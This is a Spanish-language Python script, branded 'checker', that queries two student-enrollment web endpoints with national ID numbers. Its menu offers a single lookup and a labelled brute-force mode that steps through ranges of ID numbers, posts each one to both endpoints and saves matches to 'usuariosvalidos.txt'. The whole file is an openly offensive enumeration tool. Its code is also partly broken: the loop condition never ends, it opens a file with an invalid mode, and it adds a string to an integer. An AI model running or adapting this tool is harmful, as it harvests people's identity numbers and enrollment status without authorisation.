#!/user/bin/python3
from asyncore import write
from colorama import Fore,init
import requests
import os
from time import sleep
init()
v = Fore.LIGHTGREEN_EX
re = Fore.LIGHTRED_EX
w = Fore.LIGHTWHITE_EX
c = Fore.LIGHTCYAN_EX
os.system("clear")


def banner():
 print(f'''{re}
        hh                    kk                   
   cccc hh        eee    cccc kk  kk   eee  rr rr  
 cc     hhhhhh  ee   e cc     kkkkk  ee   e rrr  r 
 cc     hh   hh eeeee  cc     kk kk  eeeee  rr     
  ccccc hh   hh  eeeee  ccccc kk  kk  eeeee rr 

  {v}Herramienta desarrollada por nicolas.$ | Discord:nicolas.$#4882\n 
 ''')
def opciones():
  print(f'{c}[+]Digite 1 para ir a consulta de un dni en especifico')
  print(f'{c}[+]Digite 2 para ir al ataque de fuerza bruta')
  print(f'{c}[+]Digite 3 para salir')




url = 'http://matriculautpruta1.com/backsave/getDocument.php'

headers ={
'Content-Type':
  'application/x-www-form-urlencoded; charset=UFT-8'

}
url2 = 'http://matriculautpruta2.com/backsave/getDocument.php'

def consulta():
    dni = input(f"{c}Digite el número de documento que quiere consultar: ")
    payload = f'num_documento={dni}'
    response = requests.post(url, 
    data=payload, headers=headers)
    response2 = requests.post(url2, 
    data=payload, headers=headers)
    if "1" in response.text:
        print(f"{v}\nMatriculado correctamente en la ruta 1")
        sleep(3)
        os.system("clear")
        banner()
        opciones()
        opc_elegida()
    elif "1" in response2.text:
        print(f"{v}\nMatriculado correctamente en la ruta 2")
        sleep(3)
        os.system("clear")
        banner()
        opciones()
        opc_elegida()
    else:
        print(f"{re}\nNo esta matriculado correctamente en ninguna ruta")
        sleep(3)
        os.system("clear")
        banner()
        opciones()
        opc_elegida()
    

def fuerza_burta():
    
    
    i= int(input("Digite los primeros 6 digitos del documento poniendo los 4 primeros 0, ejemplo 1762330000:"))
    while i < i+9999:
     payload_f = f'num_documento={i}'
     response = requests.post(url, 
     data=payload_f, headers=headers)
     response2 = requests.post(url2, 
     data=payload_f, headers=headers)
     if "1" in response.text:
         print(f'{v}\n{i} esta matriculado correctamente en la ruta 1\n')
         file = open("usuariosvalidos.txt", "a")
         os.system('echo "{}" >> usuariosvalidos.txt'.format(str(i)+" - ruta 1"))
         file.close()
         os.system(f'read -n1 -r -p presiona-cualquier-tecla-para-continuar')
         os.system("clear")
         banner()
         opciones()
         opc_elegida()

     elif "1" in response2.text:
         print(f'{v}\n{i} esta matriculado correctamente en la ruta 2\n')
         file = open("usuariosvalidos.txt", "o")
         os.system('echo "{}" >> usuariosvalidos.txt'.format(i+" - ruta 2"))
         file.close()
         os.system(f'read -n1 -r -p presiona-cualquier-tecla-para-continuar')
         os.system("clear")
         banner()
         opciones()
         opc_elegida()
     else:
         print(f'{re}\n{i} No esta matriculado correctamente en ninguna ruta')
     i+=1

def opc_elegida():
  op = str(input("\nDigite la opcione que quiere ir: "))
  if op == "1":
    os.system("clear")
    banner()
    consulta()
  elif op == "2":
    os.system("clear")
    banner()
    fuerza_burta()
  elif op == "3":
     print(f'{re}Saliendo...')
     sleep(3)
     exit()
  else:
    print(f"{re}Digite una opcion valida!")
    sleep(3)
    os.system("clear")
    banner()
    opciones()
    opc_elegida()


banner()
opciones()
opc_elegida()
